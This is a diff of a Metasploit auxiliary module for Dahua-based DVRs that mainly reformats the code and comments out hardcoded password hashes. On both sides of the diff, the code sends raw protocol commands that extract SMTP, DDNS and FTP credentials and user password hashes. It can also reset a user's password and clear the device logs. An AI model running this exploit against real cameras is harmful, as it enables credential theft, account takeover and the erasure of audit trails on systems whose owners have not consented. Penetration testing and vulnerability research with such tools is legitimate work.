@@ -32,198 +32,189 @@ class Metasploit3 < Msf::Auxiliary
 
         def run_host(ip)
                 usercount = 0
-                u1 = "\xa1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
+                u1 = "\xa1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
                      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                 dvr_resp = "\xb1\x00\x00\x58\x00\x00\x00\x00"
-                version = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" +
+                version = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" \
                           "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                email = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" +
+                email = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" \
                         "\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                ddns = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" +
+                ddns = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" \
                        "\x8c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                nas = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" +
+                nas = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" \
                       "\x25\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                channels = "\xa8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-                           "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-                           "\xa8\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" +
+                channels = "\xa8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+                           "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+                           "\xa8\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" \
                            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                groups = "\xa6\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00" +
+                groups = "\xa6\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00" \
                          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                users = "\xa6\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" +
+                users = "\xa6\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" \
                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                sn = "\xa4\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00" +
+                sn = "\xa4\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00" \
                      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                clear_logs =  "\x60\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00" +
+                clear_logs =  "\x60\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00" \
                               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                clear_logs2 = "\x60\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" +
+                clear_logs2 = "\x60\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" \
                               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 
                 user = "root"
                 pass = " w"
-                user8pwhash = "4WzwxXxM" #888888
-                user6pwhash = "sh15yfFM" #666666
-                useradminpwhash = "6QNMIQGe" #admin
+                # user8pwhash = "4WzwxXxM" #888888
+                # user6pwhash = "sh15yfFM" #666666
+                # useradminpwhash = "6QNMIQGe" #admin
                 connect
                 sock.put(u1)
                 data = sock.recv(8)
                 disconnect
                 if data == dvr_resp
-                        print_good("DVR FOUND: @ #{rhost}:#{rport}!")
-                        report_service(:host => rhost, :port => rport, :sname => 'dvr', :info => "Dahua-based DVR")
-                        connect
-                        sock.put(version)
-                        data = sock.get(1024)
-                        if data =~ /[\x00]{8,}([[:print:]]+)/
-                                ver = $1
-                                print_status("Version: #{ver} @ #{rhost}:#{rport}!")
-                        end
+                  print_good("DVR FOUND: @ #{rhost}:#{rport}!")
+                  report_service(host: rhost, port: rport, sname: 'dvr', info: "Dahua-based DVR")
+                  connect
+                  sock.put(version)
+                  data = sock.get(1024)
+                  if data =~ /[\x00]{8,}([[:print:]]+)/
+                    ver = $1
+                    print_status("Version: #{ver} @ #{rhost}:#{rport}!")
+                  end
 
-                        sock.put(sn)
-                        data = sock.get(1024)
-                        if data =~ /[\x00]{8,}([[:print:]]+)/
-                                serial = $1
-                                print_status("Serial Number: #{serial} @ #{rhost}:#{rport}!")
-                        end
+                  sock.put(sn)
+                  data = sock.get(1024)
+                  if data =~ /[\x00]{8,}([[:print:]]+)/
+                    serial = $1
+                    print_status("Serial Number: #{serial} @ #{rhost}:#{rport}!")
+                  end
 
-                        sock.put(email)
-                        if data == sock.get(1024).split('&&')
-                                print_status("Email Settings: @ #{rhost}:#{rport}!")
-                                if data[0] =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\.?+:\d+)/
-                                        if mailhost == $1.split(':')
-                                                print_status("	Server: #{mailhost[0]}")  unless mailhost[0].nil?
-                                                print_status("	Destination Email: #{data[1]}")  unless mailhost[1].nil?
-                                        end
-                                        if !data[5].nil? && !data[6].nil?
-                                                print_good("	SMTP User: #{data[5]}") unless data[5].nil?
-                                                print_good("	SMTP Password: #{data[6]}") unless data[6].nil?
-                                                muser = "#{data[5]}"
-                                                mpass = "#{data[6]}"
-                                                mailserver = "#{mailhost[0]}"
-                                                print_good("MailServer: #{mailserver}")
-                                                #destemail = "#{data[1]}" if !mailhost[1].nil?
-                                                if !mailserver.to_s.strip.length == 0 && !muser.to_s.strip.length == 0 && !mpass.to_s.strip.length == 0
-                                                   report_email_creds(mailserver, rport, muser, mpass) if !mailserver.nil? && !muser.nil? && !mpass.nil?
-                                                end
-                                        end
-                                end
-                        end
+                  sock.put(email)
+                  if data == sock.get(1024).split('&&')
+                    print_status("Email Settings: @ #{rhost}:#{rport}!")
+                    if data[0] =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\.?+:\d+)/
+                      if mailhost == $1.split(':')
+                         print_status("	Server: #{mailhost[0]}")  unless mailhost[0].nil?
+                         print_status("	Destination Email: #{data[1]}")  unless mailhost[1].nil?
+                      end
+                         if !data[5].nil? && !data[6].nil?
+                           print_good("	SMTP User: #{data[5]}") unless data[5].nil?
+                           print_good("	SMTP Password: #{data[6]}") unless data[6].nil?
+                           muser = "#{data[5]}"
+                           mpass = "#{data[6]}"
+                           mailserver = "#{mailhost[0]}"
+                           print_good("MailServer: #{mailserver}")
+                           # destemail = "#{data[1]}" if !mailhost[1].nil?
+                           if !mailserver.to_s.strip.length == 0 && !muser.to_s.strip.length == 0 && !mpass.to_s.strip.length == 0
+                             report_email_creds(mailserver, rport, muser, mpass) if !mailserver.nil? && !muser.nil? && !mpass.nil?
+                           end
+                         end
+                    end
+                  end
 
                         sock.put(ddns)
-                        if data = sock.get(1024)
-                            data = data.split(/&&[0-1]&&/)
-                               data.each_with_index {
-                                        |val, index|
-                                        if index > 0
-                                                val = val.split("&&")
-                                                ddns_service = "#{val[0]}"
-                                                ddns_server = "#{val[1]}"
-                                                ddns_port = "#{val[2]}"
-                                                ddns_domain = "#{val[3]}"
-                                                ddns_user = "#{val[4]}"
-                                                ddns_pass = "#{val[5]}"
-                                                print_status("DDNS Settings @ #{rhost}:#{rport}!:")
-                                                print_status("	DDNS Service: #{ddns_service}") unless val.nil?
-                                                print_status("	DDNS Server:  #{ddns_server}") unless val.nil?
-                                                print_status("	DDNS Port: #{ddns_port}") unless val.nil?
-                                                print_status("	Domain: #{ddns_domain}") unless val.nil?
-                                                print_good("	Username: #{ddns_user}") unless val.nil?
-                                                print_good("	Password: #{ddns_pass}") unless val.nil?
-                                                if !ddns_server.to_s.strip.length == 0 && !ddns_port.to_s.strip.length == 0 && !ddns_user.to_s.strip.length == 0 && !ddns_pass.to_s.strip.length == 0
+                        if data == sock.get(1024)
+                          data = data.split(/&&[0-1]&&/)
+                          data.each_with_index { |val, index|
+                            if index > 0
+                              val = val.split("&&")
+                              ddns_service = "#{val[0]}"
+                              ddns_server = "#{val[1]}"
+                              ddns_port = "#{val[2]}"
+                              ddns_domain = "#{val[3]}"
+                              ddns_user = "#{val[4]}"
+                              ddns_pass = "#{val[5]}"
+                              print_status("DDNS Settings @ #{rhost}:#{rport}!:")
+                              print_status("	DDNS Service: #{ddns_service}") unless val.nil?
+                              print_status("	DDNS Server:  #{ddns_server}") unless val.nil?
+                              print_status("	DDNS Port: #{ddns_port}") unless val.nil?
+                              print_status("	Domain: #{ddns_domain}") unless val.nil?
+                              print_good("	Username: #{ddns_user}") unless val.nil?
+                              print_good("	Password: #{ddns_pass}") unless val.nil?
+                              if !ddns_server.to_s.strip.length == 0 && !ddns_port.to_s.strip.length == 0 && !ddns_user.to_s.strip.length == 0 && !ddns_pass.to_s.strip.length == 0
 
-                                                  report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
-                                                end
-                                        end
-                             }
+                                report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
+                              end
+                            end
+                          }
                         end
 
                         sock.put(nas)
                         if data == sock.get(1024)
-                                print_status("Nas Settings @ #{rhost}:#{rport}!:")
-                                server = ''
-                                port = ''
-                                if data =~ /[\x00]{8,}[\x01][\x00]{3,3}([\x0-9a-f]{4,4})([\x0-9a-f]{2,2})/
-                                  server =  $1.unpack('C*').join('.')
-                                  port = $2.unpack('S')
-                                  print_status("	Nas Server #{server}")
-                                  print_status("	Nas Port: #{port}")
-                                end
-                                if data =~ /[\x00]{16,}([[:print:]]+)[\x00]{16,}([[:print:]]+)/
-                                        ftpuser = $1
-                                        ftppass = $2
-                                        print_good("	FTP User: #{ftpuser}")
-                                        print_good("	FTP Password: #{ftppass}")
-                                        if !ftpuser.to_s.strip.length == 0 && ftppass.to_s.strip.length == 0
-                                           report_creds(host: server, port: port, user: ftpuser, pass: ftppass, type: "FTP",
-                                                        active: true) if !server.nil? && !port.nil? && !ftpuser.nil? && !ftppass.nil?
-                                        end
-                                end
+                          print_status("Nas Settings @ #{rhost}:#{rport}!:")
+                          server = ''
+                          port = ''
+                          if data =~ /[\x00]{8,}[\x01][\x00]{3,3}([\x0-9a-f]{4,4})([\x0-9a-f]{2,2})/
+                            server = $1.unpack('C*').join('.')
+                            port = $2.unpack('S')
+                            print_status("	Nas Server #{server}")
+                            print_status("	Nas Port: #{port}")
+                          end
+                          if data =~ /[\x00]{16,}([[:print:]]+)[\x00]{16,}([[:print:]]+)/
+                            ftpuser = $1
+                            ftppass = $2
+                            print_good("	FTP User: #{ftpuser}")
+                            print_good("	FTP Password: #{ftppass}")
+                            if !ftpuser.to_s.strip.length == 0 && ftppass.to_s.strip.length == 0
+                              report_creds(host: server, port: port, user: ftpuser, pass: ftppass, type: "FTP",
+                                           active: true) if !server.nil? && !port.nil? && !ftpuser.nil? && !ftppass.nil?
+                            end
+                          end
                         end
 
                         sock.put(channels)
                         data = sock.get(1024).split('&&')
                         disconnect
                         if data.length > 1
-                                print_status("Camera Channels @ #{rhost}:#{rport}!:")
-                                data.each_with_index {
-                                        |val, index|
-                                        print_status("	#{index+1}:#{val[/([[:print:]]+)/]}")
-                                }
+                          print_status("Camera Channels @ #{rhost}:#{rport}!:")
+                          data.each_with_index { |val, index| print_status("	#{index + 1}:#{val[/([[:print:]]+)/]}") }
                         end
                         connect
                         sock.put(users)
                         if data == sock.get(1024).split('&&')
-                             print_status("Users\\Hashed Passwords\\Rights\\Description: @ #{rhost}:#{rport}!")
-                                 data.each {
-                                        |val|
-                                        usercount += 1
-                                        pass = "#{val[/(([\d]+)[:]([0-9A-Za-z]+)[:]([0-9A-Za-z]+))/]}"
-                                        value = pass.split(":")
-                                        username = "#{value[1]}"
-                                        md5hash = "#{value[2]}"
-                                        print_status("	#{val[/(([\d]+)[:]([[:print:]]+))/]}")
-                                        # Write the dahua hash to the database
-                                        hash = "#{rhost} #{username}:$dahua$#{md5hash}"
-                                        report_hash(ip, rport, user, hash)
-                                        # Write the vulnerability to the database
-                                        #unless reported_vuln
-                                        report_vuln(
-                                            host: rhost,
-                                            port: rport,
-                                            proto: 'tcp',
-                                            sname: 'dvr',
-                                            name: 'Dahua Authentication Password Hash Exposure',
-                                            info: "Obtained password hash for user #{username}: #{md5hash}",
-                                            refs: :references
-                                        )
-                                 }
+                          print_status("Users\\Hashed Passwords\\Rights\\Description: @ #{rhost}:#{rport}!")
+                          data.each { |val|
+                            usercount += 1
+                            pass = "#{val[/(([\d]+)[:]([0-9A-Za-z]+)[:]([0-9A-Za-z]+))/]}"
+                            value = pass.split(":")
+                            username = "#{value[1]}"
+                            md5hash = "#{value[2]}"
+                            print_status("	#{val[/(([\d]+)[:]([[:print:]]+))/]}")
+                            # Write the dahua hash to the database
+                            hash = "#{rhost} #{username}:$dahua$#{md5hash}"
+                            report_hash(ip, rport, user, hash)
+                            # Write the vulnerability to the database
+                            # unless reported_vuln
+                            report_vuln(
+                              host: rhost,
+                              port: rport,
+                              proto: 'tcp',
+                              sname: 'dvr',
+                              name: 'Dahua Authentication Password Hash Exposure',
+                              info: "Obtained password hash for user #{username}: #{md5hash}",
+                              refs: :references
+                            )
+                          }
                         end
                         sock.put(groups)
                         if data == sock.get(1024).split('&&')
-                                print_status("User Groups: @ #{rhost}:#{rport}!")
-                                   data.each {
-                                        |val|
-                                        print_status("	#{val[/(([\d]+)[:]([\w]+))/]}")
-                                   }
+                          print_status("User Groups: @ #{rhost}:#{rport}!")
+                          data.each { |val| print_status("	#{val[/(([\d]+)[:]([\w]+))/]}") }
                         end
-                          if datastore['RESET']
-                             userstring = datastore['USERNAME'] + ":Intel:" + datastore['PASSWORD'] + ":" + datastore['PASSWORD']
-                             u1 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00" \
-                                  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                             u2 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" \
-                                  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                             u3 = "\xa6\x00\x00\x00#{userstring.length.chr}\x00\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00" \
-                                  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-                                  userstring
-                                sock.put(u1)
-                                data = sock.get(1024)
-                                sock.put(u2)
-                                data = sock.get(1024)
-                                sock.put(u3)
-                                data = sock.get(1024)
-                                sock.put(u1)
-                                if data == sock.get(1024)
-                                   print_good("PASSWORD RESET!: user #{datastore['USERNAME']}'s password reset to #{datastore['PASSWORD']}! @ #{rhost}:#{rport}!")
-                                end
+                        if datastore['RESET']
+                          userstring = datastore['USERNAME'] + ":Intel:" + datastore['PASSWORD'] + ":" + datastore['PASSWORD']
+                          u1 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00" \
+                               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                          u2 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" \
+                               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                          u3 = "\xa6\x00\x00\x00#{userstring.length.chr}\x00\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00" \
+                               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + userstring
+                          sock.put(u1)
+                          # data = sock.get(1024)
+                          sock.put(u2)
+                          # data = sock.get(1024)
+                          sock.put(u3)
+                          data = sock.get(1024)
+                          sock.put(u1)
+                          if data == sock.get(1024)
+                            print_good("PASSWORD RESET!: user #{datastore['USERNAME']}'s password reset to #{datastore['PASSWORD']}! @ #{rhost}:#{rport}!")
+                          end
 # 			elsif (datastore['ACTION'] == "DELETE")
 # 				u1 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" +
 # 				     "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
@@ -297,12 +288,12 @@ class Metasploit3 < Msf::Auxiliary
                         end
 
                         if datastore['CLEAR_LOGS']
-                                sock.put(clear_logs)
-                                sock.put(clear_logs2)
-                                print_good("LOGS CLEARED! @ #{rhost}:#{rport}")
+                          sock.put(clear_logs)
+                          sock.put(clear_logs2)
+                          print_good("LOGS CLEARED! @ #{rhost}:#{rport}")
                         end
                         disconnect
-               end
+                end
         end
 
        def report_hash(ip, rport, user, hash)
